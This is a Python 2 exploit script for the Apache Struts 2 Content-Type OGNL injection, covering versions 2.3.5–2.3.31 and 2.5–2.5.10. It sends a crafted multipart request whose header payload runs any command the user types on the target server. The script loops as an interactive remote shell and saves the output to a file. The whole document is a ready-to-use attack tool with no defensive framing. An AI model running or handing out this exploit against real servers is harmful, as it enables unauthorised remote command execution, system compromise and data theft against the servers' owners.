#! /usr/bin/env python
# encoding:utf-8
import sys,urllib2

# Struts 2.3.5 - Struts 2.3.31
# Struts 2.5 - Struts 2.5.10

data = '--447635f88b584ab6b8d9c17d04d79918\
Content-Disposition: form-data; name="image1"\
Content-Type: text/plain; charset=utf-8\
\
x\
--447635f88b584ab6b8d9c17d04d79918--'

global cmd


def sav(arg):
    with open('index.html', 'w+') as f:
        f.write(arg)


def getInfo(url, cmd):
    request = urllib2.Request(str(url), data, headers={})
    request.add_header("Content-Length","155")
    request.add_header("User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36")
    request.add_header("Content-Type","%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}".replace("whoami",cmd))
    try:
        response = urllib2.urlopen(request)
        response = response.read()
    except Exception as e:
        print e
        response = "Error"
    return response

if __name__ == '__main__':
    while 1:
        url = raw_input("URL :> ")
        if len(url) > 1:
            break
    if "http" not in url:
        url = "http://" + url
    # cmd = "whoami"
    # cmd = "net user"
    cmd = raw_input("$ ")
    # print url
    # print "$ ",cmd
    resp = getInfo(url, cmd)
    if resp == "Error":
        pass
    else:
        # if len(resp) < 20:
        if len(resp):
            print resp
            while 1:
                cmd = raw_input("$: ")
                if cmd != "q":
                    resp = getInfo(url, cmd)
                    print resp
                    sav(resp)
                else:
                    break
        else:
            print resp
            print "-------- Error! --------"
